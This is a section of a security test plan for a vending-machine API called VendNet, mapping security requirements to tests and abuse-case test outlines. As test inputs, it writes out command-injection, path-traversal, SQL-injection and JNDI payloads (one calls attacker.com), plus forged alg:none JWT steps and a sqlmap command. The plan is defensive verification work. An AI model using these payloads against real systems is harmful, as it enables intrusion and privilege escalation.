# 9. Security Testing Plan

## 9.1 Security Testing Methodology

VendNet adopts a **shift-left** security testing strategy: security controls are verified as early as the first commit via SAST and SCA integrated into the CI/CD pipeline, ensuring that vulnerabilities are caught before code reaches the main branch rather than discovered late in integration. DAST and manual penetration testing against a running staging environment are scheduled once a deployable build exists at the end of Sprint 1, with IAST instrumentation added during the Sprint 2 integration test phase to capture runtime behaviour under realistic flows. A fixed manual review cadence — at sprint boundaries and whenever the architecture or DFD changes — ensures that the threat model stays in sync with implementation.

| Testing Type | Description | Tools | SDLC Phase | Trigger |
|---|---|---|---|---|
| SAST | Static analysis of source code for injection sinks, secrets, insecure API use, and missing security annotations | Semgrep (rulesets: `java.spring`, `java.lang.security`, `secrets`) | Sprint 1 — Development | Every push and pull-request merge to `main` |
| DAST | Active scanning of the deployed REST API for injection, authentication bypass, and misconfiguration | OWASP ZAP (active scan + API import via OpenAPI 3.0 spec) | Sprint 1 — Staging | Triggered after a successful CI deployment to the staging environment |
| SCA | Dependency graph analysis for known CVEs in third-party libraries | OWASP Dependency-Check (`mvn verify` phase) | Sprint 1 — Build | Every change to `pom.xml` or dependency lock file |
| IAST | Runtime instrumentation during integration test execution to surface call paths missed by SAST | Manual instrumentation via Spring Boot Actuator traces + custom `OncePerRequestFilter` hooks | Sprint 2 — Integration | Sprint 2 integration test suite execution |
| Manual Pen Testing | Targeted attack simulation against Critical and High risks from §6 (T-28, T-59, T-108, T-46, T-84, T-72, T-39) | Burp Suite Pro, `hashcat`, `sqlmap`, `jwt_tool`, custom scripts | Sprint 2 — Staging | End-of-sprint hardening checkpoint; repeated after any Critical finding is remediated |
| Unit / Integration Tests | JUnit 5 security test cases derived directly from §5 abuse cases (AC-01 – AC-08) and §8.3 security requirements | Spring Boot Test, MockMvc, Testcontainers (MySQL 8.4), WireMock | Sprint 1 & 2 | Every push; part of CI gate — build fails on any security test failure |

---

## 9.2 Threat Modeling Review Process

The threat model documented in §4 is a living artefact. Three trigger conditions mandate a formal review cycle; between triggers, the model is considered current.

### Trigger 1 — New Feature Added

**Who initiates:** The feature-owning developer opens a Threat Model Review item in the project issue tracker before the sprint planning meeting in which the feature is scheduled.

**Steps:**
1. Identify which DFD elements (processes, data flows, external entities, data stores) the new feature touches or introduces.
2. Re-run STRIDE-per-element analysis on all new and directly adjacent elements, assigning new T-IDs (continuing from T-116) using the same format as §4.2.
3. Score new threats using the OWASP Risk Rating methodology documented in §6.1; add rows to the risk register in §6.4.
4. If any new threat is Critical or High, a corresponding mitigation and SR must be created before the feature is merged.
5. Update §4.3 Threat Summary table with new rows.

**What gets updated:** §4 (new STRIDE entries and T-IDs), §6 (new risk register rows), §7 (new or extended mitigations), §8.3 (new SRs if required), and §9.3 (new traceability rows).

**Acceptance criteria:** No unmitigated Critical or High threat introduced by the feature survives sprint closure; all new T-IDs appear in the §6.4 register.

---

### Trigger 2 — Architecture Change

**Who initiates:** The team lead or architect upon any change to: the technology stack (runtime, framework, database version), network topology (new trust boundary TB-X), or DFD external entities (new integration, removal of Payment Gateway).

**Steps:**
1. Redraw the affected DFD Level 1 nodes and data flows; update §3 (Architecture) diagrams.
2. Re-assess all trust boundaries (TB1–TB4 as documented in §4.1) that are crossed by new or modified data flows.
3. Execute a full STRIDE pass on every new or modified DFD element.
4. Re-score likelihood for existing threats whose attack surface changed (e.g., a new public endpoint raises the `Opportunity` factor for several T-IDs).
5. If an architecture change removes a threat entirely (e.g., mTLS enforced on a previously unprotected endpoint eliminates T-104), mark the T-ID as `Resolved` in §6.4 with a justification.

**What gets updated:** §3, §4 (full DFD update + STRIDE re-run), §6 (revised likelihood scores, resolved entries), §7 (retired or new mitigations).

**Acceptance criteria:** All modified DFD nodes have a complete STRIDE analysis; no trust boundary crossing is undocumented; §6.4 risk scores reflect the post-change architecture.

---

### Trigger 3 — End of Sprint

**Who initiates:** The security champion or team lead as part of the sprint retrospective agenda.

**Steps:**
1. Review all security test results from the sprint (SAST findings, DAST scan reports, integration test failures, any manual pen test notes).
2. For each finding, determine whether it corresponds to an existing T-ID or represents a new, previously unmodelled threat.
3. Update residual risk scores in §6.4: if a mitigation was implemented and verified, reduce the Likelihood score; if a mitigation was deferred, flag the T-ID as `Residual — Accepted` with a sign-off.
4. Verify that every Critical and High T-ID scheduled for the sprint has an associated passing test in the traceability matrix (§9.3) before the sprint is marked Done.
5. Produce a one-page sprint security summary recording: threats addressed, test results, open residuals, and any new threats discovered.

**What gets updated:** §6.4 (residual risk scores and status), §9.3 (pass/fail status of test cases), sprint security summary artifact in the repo.

**Acceptance criteria:** Zero unaddressed Critical T-IDs at sprint end; all §9.3 test cases for in-scope SRs have a documented result (Pass, Fail, or Deferred-with-justification).

---

## 9.3 Traceability Matrix: Security Requirements → Tests → ASVS → Threats

> Every SR from §8.3 has at least one row. Every AC from §5 appears in at least one Abuse Case column. ASVS Ref uses the chapter.item format from the ASVS 5.0 Tracker.

| SR-ID | Security Requirement (short) | Test ID | Test Description | Test Type | ASVS Ref | Threat Ref | Abuse Case | Pass Criteria |
|---|---|---|---|---|---|---|---|---|
| SR-01 | MFA required for Administrator accounts | TST-01 | Attempt Admin login without TOTP code; verify 401 returned. Verify `mfa_verified` flag absent from SecurityContext without second factor | Manual Pen Test | V2.4.1 | T-12, T-07 | AC-04 | `POST /auth/login` with valid Admin credentials but no TOTP returns `HTTP 401`; Admin JWT is not issued |
| SR-02 | RBAC with exactly three roles | TST-02 | Authenticate as each of CUSTOMER, OPERATOR, ADMINISTRATOR; verify each role receives 403 on the other roles' restricted endpoints | Integration | V4.1.1 | T-11, T-36 | — | CUSTOMER receives 403 on `/admin/**`; OPERATOR receives 403 on pricing endpoints; ADMINISTRATOR can access all endpoints |
| SR-03 | Reject JWT with invalid or insecure signing algorithm | TST-03 | Submit `alg:none` JWT with `role=ADMINISTRATOR` to `GET /admin/users`; verify rejection | Manual Pen Test | V2.2.1 | T-28, T-06 | AC-04 | `HTTP 401` returned; no admin data disclosed; `UnsupportedJwtException` logged |
| SR-04 | JWT signing key ≥ 256-bit entropy; rotated every 90 days | TST-04 | Semgrep scan detects any `jwtSecret` constant shorter than 32 bytes; integration test asserts startup assertion fires on short key | SAST | V2.2.2 | T-29, T-30 | — | Semgrep exits 0 with no `jwt-weak-secret` findings; startup test with a 16-byte key throws `IllegalStateException` |
| SR-05 | Validate account status on every request; deny if SUSPENDED | TST-05 | Issue JWT; suspend account via Admin API; replay JWT on a protected endpoint within TTL | Integration | V2.3.1 | T-35, T-64 | — | Replayed JWT after account suspension returns `HTTP 401`; Redis blocklist entry verified present |
| SR-06 | Authorization at both controller and service layer | TST-06 | Semgrep rule `spring.PreAuthorize-missing` scans all `@RestController` and `@Service` classes; ArchUnit rule asserts `@EnableMethodSecurity` present | SAST | V4.1.2 | T-36, T-11 | — | Semgrep exits 0 with no missing-annotation findings; ArchUnit test passes in CI |
| SR-07 | Account locked after 5 failed logins within 15 min (30 min lockout) | TST-07 | Submit 6 consecutive failed login attempts for a known username; verify 6th returns lockout response; verify account unlocks after 30 min | Integration / DAST | V2.1.2 | T-01, T-05 | — | 6th attempt returns `HTTP 401` with `accountStatus=LOCKED`; subsequent correct-password attempt within 30 min returns 401; attempt at 30 min + 1 s returns 200 |
| SR-08 | Users may only access their own data | TST-08 | Authenticate as Customer A; call `GET /customers/{idB}/history` using Customer B's UUID; verify 404 | Integration | V4.2.1 | T-04, T-48 | — | `HTTP 404` returned (not 403, to avoid confirming existence); no records for User B in response body |
| SR-09 | Parameterised queries for all DB access | TST-09 | ZAP active scan with SQL injection payloads against `/products?name=`, `/machines?serial=`, `/sales?status=`; Semgrep `java.lang.security.audit.sqli` scan | SAST / DAST | V5.2.1 | T-39, T-72, T-74 | AC-05 | ZAP active scan finds no SQL injection findings; Semgrep exits 0 with no `sql-injection` category findings |
| SR-10 | Background job queries use parameterised binding | TST-10 | ArchUnit rule asserts no `@Scheduled` or `@EventListener` method calls `createNativeQuery(String)` with string concatenation | SAST | V5.2.3 | T-110 | — | ArchUnit `NativeQueryInScheduledMethodsRule` test passes with 0 violations |
| SR-11 | DB credentials in environment variables; not hardcoded | TST-11 | Semgrep `secrets` ruleset scans codebase and git history (`truffleHog`) for hardcoded JDBC URLs, passwords, or usernames | SAST | V5.3.5 | T-70 | — | Semgrep and truffleHog both exit 0 with no credential findings; `application.properties` contains only `${MYSQL_*}` placeholders |
| SR-12 | DB user has minimum required privileges (DML only, no DDL) | TST-12 | Connect to MySQL as `vendnet_app` user; attempt `CREATE TABLE test_t (id INT)` and `DROP TABLE users`; verify both fail | Manual | V5.3.4 | T-77 | — | Both DDL statements return `ERROR 1142 (42000): CREATE/DROP command denied` |
| SR-13 | Sensitive PII encrypted at rest in database | TST-13 | Query `SELECT email, full_name FROM users LIMIT 1` directly via MySQL client; verify values are stored in encrypted or hashed form | Manual | V6.2.1 | T-70, T-71 | — | Raw `email` and `full_name` column values are not plaintext; AES-256 ciphertext or hash verified |
| SR-14 | Backup files AES-256 encrypted before storage | TST-14 | Trigger `POST /admin/backups`; locate resulting file under `/var/vendnet/backups/`; attempt to read as plaintext SQL | Manual | V6.2.2 | T-61, T-78 | — | File content is binary ciphertext; `file` command reports `data`; `strings` produces no recognisable SQL keywords |
| SR-15 | Transaction consistency prevents concurrent update issues | TST-15 | Fire 50 concurrent `POST /sales` requests for the same machine/slot with `CurrentQuantity=1`; verify exactly 1 succeeds | Integration | V5.2.5 | T-45 | AC-07 | Exactly 1 `Sale` record created; `Slot.CurrentQuantity` is 0, not -1; all other requests return `HTTP 409` or `HTTP 404` |
| SR-16 | API responses use dedicated DTOs; no sensitive field leakage | TST-16 | Call `GET /admin/users`; verify `passwordHash` absent from response; call `PUT /machines/{id}` with extra `price` field; verify 400 | Integration | V5.1.4 | T-43, T-100 | — | Response JSON does not contain `passwordHash` key; request with unknown field returns `HTTP 400 Bad Request` |
| SR-17 | All API communications use HTTPS with TLS 1.2 or higher | TST-17 | ZAP active scan with TLS configuration check; attempt plain HTTP connection to API port | DAST | V9.1.1 | T-85, T-97 | — | ZAP TLS scan finds no weak cipher suites or protocol downgrade vulnerabilities; plain HTTP request receives 301 redirect or TCP reset |
| SR-18 | Vending machines authenticate via mTLS | TST-18 | Send telemetry `POST /machines/{id}/telemetry` without client certificate; send with a self-signed certificate not in the CA trust store | Manual | V9.1.2 | T-18, T-101, T-23 | AC-08 | Both requests return `HTTP 400` TLS handshake failure; no telemetry data persisted |
| SR-19 | Payment Gateway callbacks authenticated via HMAC-SHA256 | TST-19 | POST to `EP3` with a forged `X-Signature` header computed with an incorrect key; POST with correct HMAC but `status` field modified | Manual Pen Test | V9.1.3 | T-24, T-108, T-109 | AC-02 | Forged-signature request returns `HTTP 401`; field-modified request returns `HTTP 401` (HMAC covers full raw body); no `Sale` record created |
| SR-20 | Security keys for external integrations rotated periodically | TST-20 | Verify `PAYMENT_HMAC_SECRET` env var exists and has length ≥ 32 bytes; inspect key rotation runbook in repo | Manual | V2.2.3 | T-24, T-108 | — | `echo ${#PAYMENT_HMAC_SECRET}` ≥ 32; key rotation runbook document present in repo with a documented 90-day schedule |
| SR-21 | Verify identity of external services before connections | TST-21 | Configure Payment Gateway HTTP client to use a self-signed certificate; verify outbound request fails TLS validation | DAST | V9.1.1 | T-106 | — | Payment Gateway integration test with untrusted server certificate throws `SSLHandshakeException`; no request proceeds |
| SR-22 | Compromised devices blocked from accessing the system | TST-22 | Revoke a test machine certificate via CRL; attempt telemetry submission with the revoked certificate | Manual | V9.1.2 | T-18, T-101 | — | Post-revocation telemetry submission returns `HTTP 400` TLS handshake failure within the CRL propagation window |
| SR-23 | Suspicious device activity logged | TST-23 | Submit telemetry from a machine certificate connecting from an IP outside `machines.expected_network_cidr`; check audit log | Manual | V7.1.3 | T-18, T-101 | — | `CERT_UNEXPECTED_NETWORK` event present in `audit_log` with `machineId`, source IP, and timestamp within 5 s of submission |
| SR-24 | Product price resolved server-side; client-supplied value rejected | TST-24 | POST `{"productId":"P-01","unitPrice":0.01,"quantity":1}` to `/sales` with a valid Customer JWT; verify `unitPrice` in persisted `Sale` equals catalog price | Integration / DAST | V5.1.1 | T-46 | AC-03 | `Sale.unitPrice` equals `Product.price` from catalog regardless of submitted `unitPrice`; ZAP scan finds no parameter tampering path |
| SR-25 | Stock quantities validated against valid limits before saving | TST-25 | Submit stock update with `currentQuantity = -1` and `currentQuantity = SlotCapacity + 1`; verify both rejected | Integration | V5.1.2 | T-45 | AC-07 | Both requests return `HTTP 400`; `Slot.currentQuantity` unchanged in database; Bean Validation `@Min(0)` error message present in response |
| SR-26 | File operations restricted to approved directories | TST-26 | POST `{"reportType":"../../../../etc/cron.d/vendnet"}` to `/admin/reports`; POST URL-encoded variant `%2e%2e%2f%2e%2e%2fetc%2fcron.d%2fvendnet` | Manual Pen Test | V5.3.6 | T-58, T-113, T-84 | AC-06 | Both requests return `HTTP 400`; no directory created outside `/var/vendnet/reports/`; `SecurityException` logged with the attempted path |
| SR-27 | File operations do not follow unsafe links | TST-27 | Create symlink `ln -s /etc /var/vendnet/reports/etc_link` as the service account; trigger report generation targeting `etc_link/` | Manual | V5.3.7 | T-80 | — | Report generation throws `SecurityException: Symlink in report path`; no data written to `/etc/` |
| SR-28 | All incoming data validated against expected formats and ranges | TST-28 | Submit telemetry with `temperature = 9999.9` (above max), `status = ${jndi:ldap://attacker.com/}`, and a 10 MB payload | DAST / Integration | V5.2.4 | T-56 | — | All three requests return `HTTP 400`; Bean Validation errors present; oversized payload rejected at Tomcat connector layer before reaching controller |
| SR-29 | Requests with unexpected fields rejected | TST-29 | POST `/machines/{id}/slots/{n}/stock` with body `{"slotNumber":1,"currentQuantity":50,"price":0.01}` | Unit / Integration | V5.1.4 | T-43 | — | `HTTP 400` returned; `spring.jackson.deserialization.fail-on-unknown-properties=true` triggers `UnrecognizedPropertyException`; `price` field not persisted |
| SR-30 | Maximum request payload size enforced (1 MB) | TST-30 | Send POST request with a 2 MB body to any endpoint | DAST | V5.1.5 | T-92 | — | Request rejected at Tomcat connector layer with `HTTP 413 Payload Too Large`; no controller method invoked |
| SR-31 | Paginated response limits enforced | TST-31 | Call `GET /products?size=10000` and `GET /products` with no pagination parameters | Integration | V5.1.5 | T-92 | — | Both responses return at most 100 records (the documented maximum); response includes `page`, `size`, `totalElements` pagination metadata |
| SR-32 | Third-party dependencies scanned for CVEs | TST-32 | Run OWASP Dependency-Check as part of `mvn verify`; assert build fails on CVSS ≥ 7.0 findings | SCA | V14.2.1 | — | — | `mvn verify` exits non-zero when any direct dependency has a CVSS ≥ 7.0 CVE; HTML report artifact published to CI |
| SR-33 | Frameworks and dependencies kept up to date | TST-33 | OWASP Dependency-Check report lists zero known High/Critical CVEs in current dependency set | SCA | V14.2.2 | — | — | Dependency-Check report contains 0 findings with CVSS ≥ 7.0 for the current `pom.xml` dependency versions |
| SR-34 | Fixed dependency versions; no version ranges | TST-34 | Semgrep rule detects Maven version ranges (e.g., `[1.0,)`) in `pom.xml`; Dependency-Check uses pinned version hashes | SCA | V14.1.1 | — | — | Semgrep exits 0 with no `maven-version-range` findings; all dependency versions in `pom.xml` are explicit without ranges |
| SR-35 | SSL certificates validated for all external connections | TST-35 | Configure test Payment Gateway with an expired certificate; verify outbound call fails | DAST | V9.1.1 | — | — | `PaymentGatewayClient` throws `SSLHandshakeException` on expired server certificate; circuit breaker triggers fallback; no payment authorised |
| SR-36 | Timeouts: 5 s response, 3 s connection for external services | TST-36 | Mock Payment Gateway to delay response by 6 s; verify client-side timeout fires | Integration | V11.2.2 | — | — | `PaymentGatewayClient` throws `SocketTimeoutException` after ≤ 5 s; circuit breaker `fallbackMethod` invoked; customer receives `HTTP 503` |
| SR-37 | All authentication events logged | TST-37 | Perform successful login, failed login, and suspended-account login attempt; inspect audit log | Integration / Manual | V7.1.3 | T-31, T-32 | — | Audit log contains one entry per event with fields: `eventType`, `username`, `clientIp`, `userAgent`, `timestamp`, `outcome` |
| SR-38 | All inventory changes logged (stock, price, configuration) | TST-38 | Update slot stock via `PUT /machines/{id}/slots/{n}/stock`; update product price; inspect audit log | Integration | V7.1.1 | T-08, T-40, T-65 | — | Audit log entry present for each operation with: `operatorId`, `machineId`, `slotNumber` or `productId`, old value, new value, `timestamp` |
| SR-39 | All role and permission changes logged | TST-39 | Change user role via Admin API; inspect audit log for `ROLE_CHANGE` event | Integration | V7.1.2 | T-13 | — | Audit log contains `ROLE_CHANGE` entry with `initiatorUserId`, `targetUserId`, `fromRole`, `toRole`, `timestamp` |
| SR-40 | All payment transactions and status logged | TST-40 | Complete a successful purchase; inspect audit log for payment event | Integration | V7.1.4 | T-47 | — | Audit log entry contains `transactionRef` (non-null), `amount`, `paymentStatus=COMPLETED`, `saleId`, `timestamp` |
| SR-41 | Audit logs protected against tampering | TST-41 | Manually modify one byte in an audit log file under `/var/vendnet/logs/audit/`; trigger nightly HMAC verification job | Manual | V7.3.4 | T-79 | — | Nightly verification job detects the tampered entry and triggers Spring Boot Actuator `DOWN` health status within one verification cycle |
| SR-42 | Administrative file operations logged | TST-42 | Trigger on-demand backup via `POST /admin/backups`; trigger report generation via `POST /admin/reports`; inspect audit log | Integration | V7.1.3 | T-60, T-81 | AC-01 | Audit log entries present for both operations with: `adminUserId` (from JWT `sub`), `operationType`, `filePath`, `timestamp` |
| SR-43 | Database changes logged for audit and recovery | TST-43 | Enable MySQL binary log; verify `binlog_format=ROW`; perform a direct `UPDATE` via MySQL client; verify binary log captures it | Manual | V7.3.1 | T-73 | — | `mysqlbinlog` output shows the `UPDATE` event with table, old row, and new row values; binary log file present under `/var/log/mysql/` |
| SR-44 | Alerts generated for suspicious or abnormal activity | TST-44 | Trigger 10 failed logins in 60 s; trigger 200 purchase requests in 60 s from one account; trigger a zero-price update | Integration | V7.4.2 | T-05, T-65, T-34, T-88 | — | Each scenario emits a corresponding alert event to the audit log (`BRUTE_FORCE_DETECTED`, `RATE_LIMIT_EXCEEDED`, `ZERO_PRICE_ATTEMPT`); Spring Boot Actuator metrics reflect count increment |
| SR-45 | Sensitive data not stored in logs | TST-45 | Enable DEBUG logging in a test profile; perform login and payment; inspect log files for password or JWT content | SAST / Manual | V7.1.5 | T-87, T-89 | — | Semgrep `java.spring.security.audit.spring-debug-logging` exits 0; log files contain no `password`, `jwt=ey`, or raw `Authorization` header values |
| SR-46 | Error details limited in logs and responses | TST-46 | Submit malformed SQL via API parameter; submit invalid JWT; inspect HTTP response bodies and log files | DAST | V7.4.1 | T-75 | — | HTTP response bodies contain only `{"status":400,"error":"Bad Request","message":"Invalid input","timestamp":"..."}` with no SQL fragment, stack trace, or class name |

---

## 9.4 Test Case Outlines Derived from Abuse Cases

### AC-01 — OS Command Injection via ProcessBuilder Backup Endpoint

**Objective:** Verify that no user-supplied string reaches the `ProcessBuilder` argument array in the backup service.

**Preconditions:**
- A valid Administrator-scoped JWT is available.
- The staging API is running with the backup endpoint exposed at `POST /admin/backups`.
- The test runner has shell access to `/var/vendnet/` to verify no unexpected files are created.

**Steps:**
1. Authenticate as Administrator; capture the issued JWT.
2. Submit `POST /admin/backups` with body `{"label":"daily; id > /tmp/cmd_injection_test"}` and `Authorization: Bearer <admin_jwt>`.
3. Submit `POST /admin/backups` with body `{"label":"../../../../etc/cron.d/vendnet_test"}`.
4. Submit `POST /admin/backups` with a valid enum value `{"label":"ON_DEMAND"}` to confirm the legitimate flow still works.
5. Check `/tmp/` for `cmd_injection_test`; check `/etc/cron.d/` for `vendnet_test`; check `/var/vendnet/backups/` for the legitimate backup file.

**Expected Result:** Steps 2 and 3 return `HTTP 400`; no files created outside `/var/vendnet/backups/`; step 4 returns `HTTP 200` and a timestamped backup file is created under `/var/vendnet/backups/`.

**Related Abuse Case:** AC-01  
**Related SR:** SR-26, SR-42  
**Tool / Approach:** Burp Suite Repeater; manual shell inspection of `/tmp/` and `/etc/cron.d/`

---

### AC-02 — Forged Payment Confirmation Webhook via HMAC Bypass

**Objective:** Verify that a crafted webhook with an invalid or forged HMAC-SHA256 signature is rejected before any sale record is created.

**Preconditions:**
- The staging API is running with `EP3` (`POST /payments/callback`) accessible.
- A test transaction reference `TXN-TEST-001` does not exist in the `processed_webhooks` table.
- The correct `PAYMENT_HMAC_SECRET` is known to the tester for the positive control.

**Steps:**
1. Craft payload: `{"transactionRef":"TXN-TEST-001","status":"COMPLETED","amount":2.50,"machineId":"M-01","productId":"P-01"}`.
2. Compute HMAC-SHA256 over the raw body using a **wrong** key (e.g., `wrong-secret`); set `X-Signature: sha256=<wrong_hmac>`; POST to `/payments/callback`.
3. Repeat with the correct key but modify `"status":"FAILED"` in the body **after** computing the HMAC over the original body.
4. Repeat with the correct key and unmodified body (positive control).
5. Inspect the `sale` table for any record with `transactionRef=TXN-TEST-001`.

**Expected Result:** Steps 2 and 3 return `HTTP 401`; no `Sale` record created for either; step 4 returns `HTTP 200` and exactly one `Sale` record with `paymentStatus=COMPLETED` and `transactionRef=TXN-TEST-001`.

**Related Abuse Case:** AC-02  
**Related SR:** SR-19, SR-20  
**Tool / Approach:** `curl` or Burp Suite Repeater; Python `hmac` module for signature computation; direct MySQL query for post-condition verification

---

### AC-03 — Client-Supplied Unit Price Bypasses Server-Side Catalog Validation

**Objective:** Verify that `unitPrice` submitted in the purchase request body has no effect on the committed `Sale.unitPrice`.

**Preconditions:**
- A valid Customer-scoped JWT is available.
- Product `P-01` has a catalog price of £2.50 and `Slot.currentQuantity ≥ 1`.
- An intercepting proxy (Burp Suite) is positioned between the test client and the API.

**Steps:**
1. Authenticate as Customer; capture the issued JWT.
2. Capture a legitimate `POST /sales` request for product `P-01`.
3. Using Burp Repeater, modify the request body to `{"productId":"P-01","machineId":"M-01","slotNumber":1,"unitPrice":0.01,"quantity":1}`.
4. Send the modified request with the valid Customer JWT.
5. If a `Sale` record is created (HTTP 200/201), query it and check `sale.unit_price`.

**Expected Result:** Either the request is rejected with `HTTP 400` because `unitPrice` is an unknown field (if `@JsonIgnoreProperties(ignoreUnknown=false)` is active), or the request succeeds but `sale.unit_price = 2.50` (catalog price), not `0.01`.

**Related Abuse Case:** AC-03  
**Related SR:** SR-24, SR-29  
**Tool / Approach:** Burp Suite Repeater; direct MySQL query `SELECT unit_price FROM sale ORDER BY created_at DESC LIMIT 1`

---

### AC-04 — JWT alg:none Signature Bypass Grants Arbitrary Identity

**Objective:** Verify that a token with `"alg":"none"` is unconditionally rejected by the JWT validation filter.

**Preconditions:**
- Any valid JWT (any role) is obtainable via `POST /auth/login`.
- The staging API's admin endpoint `GET /admin/users` is accessible over HTTPS.

**Steps:**
1. Obtain any valid JWT via `POST /auth/login`.
2. Base64-decode the header; replace `{"alg":"HS256","typ":"JWT"}` with `{"alg":"none","typ":"JWT"}`; base64url-encode.
3. Base64-decode the payload; replace `"role":"CUSTOMER"` with `"role":"ADMINISTRATOR"`; base64url-encode.
4. Construct the crafted token: `<new_header>.<new_payload>.` (empty signature).
5. Submit `GET /admin/users` with `Authorization: Bearer <crafted_token>`.
6. Repeat with `"alg":"NONE"`, `"alg":"None"`, and `"alg":""` variants.

**Expected Result:** All variants return `HTTP 401` with no user data disclosed; `UnsupportedJwtException` logged for each attempt.

**Related Abuse Case:** AC-04  
**Related SR:** SR-03, SR-04  
**Tool / Approach:** `jwt_tool` (`python jwt_tool.py -X a`); manual base64url manipulation; Burp Suite Repeater

---

### AC-05 — SQL Injection via Application Input Modifies Database Records

**Objective:** Verify that no API input path reaches a MySQL interpreter without parameterised binding.

**Preconditions:**
- A valid Operator-scoped JWT is available.
- The staging API's product search endpoint is accessible.
- A test MySQL user `attacker_test` does not exist before the test.

**Steps:**
1. Authenticate as Operator; capture JWT.
2. Submit `GET /products?name=Juice'` — observe response: if `HTTP 500` with SQL fragment in body, injection surface confirmed.
3. Submit `GET /products?name=Juice' AND SLEEP(2)--` — measure response time.
4. Submit `GET /products?name=Juice'; UPDATE users SET role='ADMINISTRATOR' WHERE username='attacker_test_user';--`.
5. Post-test: query `SELECT role FROM users WHERE username='attacker_test_user'` to verify role was not modified.
6. Run `sqlmap --url "https://staging/products?name=*" --technique=BEUSTQ --dbms=mysql` (with authorization) against the full API surface.

**Expected Result:** Step 2 returns `HTTP 200` with empty list or `HTTP 400` (no SQL fragment in response body); step 3 response time < 1 s (no `SLEEP` executed); step 5 shows role unchanged; `sqlmap` reports 0 injectable parameters.

**Related Abuse Case:** AC-05  
**Related SR:** SR-09, SR-10  
**Tool / Approach:** `sqlmap`; Burp Suite Repeater; direct MySQL post-condition query

---

### AC-06 — Path Traversal Writes Cron Entry Outside /var/vendnet/ Sandbox

**Objective:** Verify that path traversal sequences in `reportType` are neutralised before any filesystem operation.

**Preconditions:**
- A valid Administrator-scoped JWT is available.
- The report generation endpoint `POST /admin/reports` is accessible.
- The tester has read access to `/etc/cron.d/` to verify no files were created there.

**Steps:**
1. Submit `POST /admin/reports` with `{"reportType":"sales"}` (positive control); verify HTTP 200 and file under `/var/vendnet/reports/sales/`.
2. Submit `{"reportType":"../../../../etc/cron.d/vendnet_persist"}`.
3. Submit URL-encoded variant `{"reportType":"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fcron.d%2fvendnet_persist"}`.
4. Submit double-encoded variant `{"reportType":"%252e%252e%252f%252e%252e%252fetc%252fcron.d%252fvendnet_persist"}`.
5. Submit null-byte variant `{"reportType":"sales\x00../../../../etc/cron.d/vendnet_persist"}`.
6. Check `/etc/cron.d/` for any new file after each attempt.

**Expected Result:** Steps 2–5 all return `HTTP 400`; no files created in `/etc/cron.d/`; `SecurityException: Path traversal` logged with the normalised attempted path for each variant.

**Related Abuse Case:** AC-06  
**Related SR:** SR-26, SR-27  
**Tool / Approach:** Burp Suite Repeater; manual filesystem inspection; `dotdotpwn` path traversal fuzzer against the report endpoint

---

### AC-07 — TOCTOU Race Condition Drives Stock to Negative Quantity

**Objective:** Verify that pessimistic locking on the `Slot` row prevents concurrent purchases from driving `currentQuantity` below 0.

**Preconditions:**
- Two valid Customer-scoped JWTs are available (accounts A and B).
- Slot `M-03:5` has `currentQuantity = 1`.
- The test database can be inspected directly after the test.

**Steps:**
1. Using a multi-threaded test client (e.g., Java `CountDownLatch`), fire 50 concurrent `POST /sales` requests targeting `{"machineId":"M-03","slotNumber":5,"productId":"P-77"}` split across both Customer JWTs.
2. Wait for all requests to complete.
3. Query `SELECT COUNT(*) FROM sale WHERE machine_id='M-03' AND slot_number=5` and `SELECT current_quantity FROM slot WHERE machine_id='M-03' AND slot_number=5`.

**Expected Result:** Exactly 1 `Sale` record created; `Slot.currentQuantity = 0`; all other 49 requests return `HTTP 409 Conflict` or `HTTP 404`; no `currentQuantity < 0` value in the database at any point.

**Related Abuse Case:** AC-07  
**Related SR:** SR-15, SR-25  
**Tool / Approach:** JUnit 5 `@Test` with `ExecutorService` and `CountDownLatch`; direct MySQL post-condition query; Testcontainers for isolated MySQL 8.4

---

### AC-08 — Coordinated Compromised VM Fleet Floods Telemetry Database

**Objective:** Verify that per-machine rate limiting prevents a single or multi-machine telemetry flood from exhausting MySQL disk or the Tomcat thread pool.

**Preconditions:**
- At least two test machine mTLS certificates are available for the staging environment.
- The per-machine rate limit is configured to 2 requests per 60 s per machine CN.
- Disk usage of `/var/lib/mysql/` is monitored during the test.

**Steps:**
1. Using a multi-threaded HTTP client with machine certificate M-TEST-01, send 200 telemetry POST requests to `/machines/M-TEST-01/telemetry` within 60 s.
2. Observe API responses: first 2 should succeed with `HTTP 200`; subsequent should return `HTTP 429 Retry-After: 60`.
3. Simultaneously run 200 requests from machine M-TEST-02 and verify independent rate limiting.
4. Monitor the `telemetry` table row count — it should not grow beyond 2 rows per machine per test window.
5. Verify that concurrent legitimate `POST /sales` requests from a Customer JWT succeed during the flood.

**Expected Result:** Per-machine: 2 `HTTP 200` followed by 198 `HTTP 429`; telemetry table grows by exactly 4 rows (2 per machine); sales endpoint continues to respond within 500 ms p95 during the flood; `MACHINE_RATE_LIMIT_EXCEEDED` events in audit log.

**Related Abuse Case:** AC-08  
**Related SR:** SR-18, SR-30  
**Tool / Approach:** Apache `ab` or `k6` with mTLS client certificate configuration; MySQL `SELECT COUNT(*) FROM telemetry` post-condition check; Spring Boot Actuator `/actuator/metrics/http.server.requests` for latency observation

---

## 9.5 Coverage Analysis

The following table counts Security Requirements per category from §8.3 of 08_Requirements.md and maps each to its test coverage status.

| Category | Total SRs | SRs with Tests | Coverage % |
|---|:---:|:---:|:---:|
| Auth & Access Control (SR-01 – SR-08) | 8 | 8 | 100% |
| Data Security (SR-09 – SR-16) | 8 | 8 | 100% |
| Communication Security (SR-17 – SR-23) | 7 | 7 | 100% |
| Input Validation & Data Handling (SR-24 – SR-31) | 8 | 8 | 100% |
| Third-Party Components (SR-32 – SR-36) | 5 | 5 | 100% |
| Logging & Monitoring (SR-37 – SR-46) | 10 | 10 | 100% |
| **Total** | **46** | **46** | **100%** |

**Abuse Case coverage:** All 8 abuse cases (AC-01 through AC-08) appear in at least one row of the traceability matrix (§9.3) and have a dedicated test case outline in §9.4. The mapping is:

| Abuse Case | STRIDE | Severity | Primary SR | Traceability Row(s) |
|---|---|:---:|---|---|
| AC-01 | Tampering | Critical | SR-26, SR-42 | TST-26, TST-42 |
| AC-02 | Spoofing | Critical | SR-19, SR-20 | TST-19, TST-20 |
| AC-03 | Tampering | Critical | SR-24, SR-29 | TST-24, TST-29 |
| AC-04 | Spoofing | Critical | SR-03, SR-04 | TST-03, TST-04 |
| AC-05 | Tampering | Critical | SR-09, SR-10 | TST-09, TST-10 |
| AC-06 | Elevation of Privilege | Critical | SR-26, SR-27 | TST-26, TST-27 |
| AC-07 | Tampering | High | SR-15, SR-25 | TST-15, TST-25 |
